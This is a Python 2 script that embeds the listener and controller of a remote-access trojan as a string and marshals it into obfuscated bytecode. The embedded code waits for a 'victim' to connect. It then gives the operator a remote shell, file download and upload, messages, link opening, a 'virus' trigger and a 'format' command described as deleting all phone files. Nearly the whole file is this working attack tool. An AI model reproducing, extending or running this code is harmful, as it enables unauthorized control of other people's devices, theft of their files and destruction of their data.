# -*- coding: utf-8 -*-
import marshal
alzaeem = ("""
import os
import sys
import time
run = sys.argv[-1]
if run == 'assistant.py':
 x = ('\033[1;32m[\033[1;31m*\033[1;32m] \033[1;32mSorry you cannot \033[1;31mrun\033[1;32m this file\033[1;37m')
 print('')
 for i in x:
               sys.stdout.write(i)
               sys.stdout.flush()
               time.sleep(0.04)
 print('')
 sys.exit()
else:
 host = sys.argv[1]
 port = int(sys.argv[2])
 import sys
 from time import sleep
 try:
     import pathlib
 except ImportError:
     os.system('pip2 install pathlib')




import socket
import sys
from time import sleep
import os
os.system('clear')
print("\033[1;31m[\033[1;32m*\033[1;31m]\033[1;37m STARTING LISTEING ON  HOST \033[1;32m:\033[1;33m "+str(host))
print("\033[1;31m[\033[1;32m*\033[1;31m]\033[1;37m STARTING LISTEING ON  PORT\033[1;32m :\033[1;33m "+str(port))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)
print("\033[1;31m[\033[1;32m*\033[1;31m]\033[1;37m WAITING CONNECT IN VICTM \033[1;31m.\033[1;33m .\033[1;32m .\033[1;35m!\033[1;37m")
c, _ = s.accept()
os.system('clear')
print('\033[1;31m[\033[1;32m*\033[1;31m]\033[1;32m SESSIONS  OPENED \033[1;33m|\033[1;36m ' + '\033[1;31mIP \033[1;37m:\033[1;36m ' + _[0] + '\033[1;33m | \033[1;31mPORT \033[1;37m:\033[1;36m ' + str(_[1])+'\033[1;37m')
########################################################
def file():
 while True:
  f_p = raw_input('\033[1;37mEnter File Path\033[1;31m : \033[1;37m')
  c.send(f_p)
  if f_p == 'back':
     main2()
  elif f_p == '':
     file()
  try:
      f = c.recv(1073741824)
      path = f_p
      alzaeem = pathlib.PurePath(path)
      o = alzaeem.name
      print('')
      f_n = ("download/"+ o +"")
      n_f = open(f_n, 'wb')
      n_f.write(f)
      n_f.close()
      print('\033[1;32mdone . . .')
      print('\033[1;32mSave \033[1;33min \033[1;34mdownload/'+ o +'\033[1;37m')
  except IOError:
      print('\033[1;31mWrong path\033[1;37m')
      file()

#try:
#      os.mkdir('download')
#  except OSError:
#      print('')




def chat():
 while True:
  d = raw_input('\033[1;31m[ \033[1;37mchat\033[1;31m ]\033[1;37mEnter a message\033[1;31m :\033[1;37m ')
  c.send(d)
  if d == 'back':
     main2()
  #c.send(d)
########################################################
def main2():
 while True:
  print('''
 command           importance
----------       ----------------
 shell         :To browse and control victim files
 chat          :Send a message to the victim
 download      :To download files from the victim's device
 upload        :Upload files to the victim
''')
  vr = raw_input('\033[1;31m[\033[1;32m*\033[1;31m]\033[1;36mLEDEAR_HACKING \033[1;31m》\033[1;33m》\033[1;32m》\033[1;37m ')
  c.send(vr)
  if vr == "shell":
     print('\033[1;37mhelp       :for show options\033[1;37m ')
     print('\033[1;37mback       :for back to main')
     shell()
  elif vr == 'chat':
       print('back   :for back to main')
       print('''clear  :Clean the victim\'s screen ''')
       print('')
       chat()
  elif vr == 'upload':
      print('\033[1;31m[\033[1;37m upload\033[1;31m ]')
      print('\033[1;37mback       :for back to main')
      print('')
      upload()
  elif vr == 'download':
      try:
          os.mkdir('download')
      except OSError:
          print('')
          print('\033[1;31m[\033[1;37m download\033[1;31m ]\033[1;37m')
          print('back       :for back to main')
          print('')
          file()


####################
def upload():
 while True:
  file_p = raw_input('Enter path file: ')
  if file_p == 'back':
     main2()
  elif file_p == '':
     upload()
  try:
      path = file_p
      alzaeem = pathlib.PurePath(path)
      o = alzaeem.name
      c.send(o)
      sleep(1)
      f = open(file_p, 'rb')
      data = f.read()
      c.send(data)
  except IOError:
      print('\033[1;31mWrong path\033[1;37m')
      upload()

def shell():
  while True:
     print" "
     cmd = raw_input('\033[1;31m[\033[1;37m shell\033[1;31m ]\033[1;37m : ')
     if cmd == 'back':
        c.send('back')
        main2()
     elif cmd[0:5] == 'mkdir':
      c.send(cmd+' && pwd')
      c.recv(1024)
     elif cmd == 'format':
      c.send('format')
     elif cmd == 'help':
      print('''\033[1;37m

  command           importance
\033[1;34m-------------------------------------------\033[1;37m
format          \033[1;34m: \033[1;37mDelete all phone files
\033[1;37mrm -rf <file>  \033[1;34m : \033[1;37mTo delete a specific file
\033[1;37mmkdir           \033[1;34m: \033[1;37mCreate file in the victim's machine
\033[1;37mmv <file> <path>\033[1;34m: \033[1;37mTo transfer files
\033[1;37mvirus           \033[1;34m: \033[1;37mVirus activation
\033[1;37mcd /sdcard      \033[1;34m: \033[1;37mTo enter the internal memory
\033[1;37mls             \033[1;34m : \033[1;37mView files
\033[1;37mopen + Link    \033[1;34m : \033[1;37mTo open a link on the victim
\033[1;34m-------------------------------------------
\033[1;37m''')

     elif cmd[0:2] == 'rm':
      c.send(cmd+' && pwd')
      c.recv(1024)
					
     elif cmd[0:5] == 'rmdir':
      c.send(cmd+' && pwd')
      c.recv(1024)
				
     elif cmd[0:6] == 'whoami':
      c.send('whoami')
      print c.recv(1024)
     elif cmd == '':
      shell()
     elif cmd == 'virus':
      c.send('virus')
     elif cmd == 'clear':
      os.system('clear')
     else:
      c.send(cmd)
      results = c.recv(4096)
      if results == 'bacod':
       shell()
      print results

try:
    main2()
except KeyboardInterrupt:
    exit = raw_input(' want to end the session? [\033[1;31mY\033[1;33m/\033[1;32mn\033[1;37m]\033[1;31m :\033[1;37m ')
    if exit == 'y' or exit == 'Y':
     print("\033[1;31mSession is closing . . .  \033[1;37m")
     sys.exit()
    elif exit == 'n' or exit == 'N':
         main2()

except socket.error:
    print("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;31m Payload Closed . . . \033[1;37m")
    sys.exit()
""")


alzaeem2 = compile(alzaeem, '<alzaeem>', 'exec')
data = marshal.dumps(alzaeem2)
print repr(data)
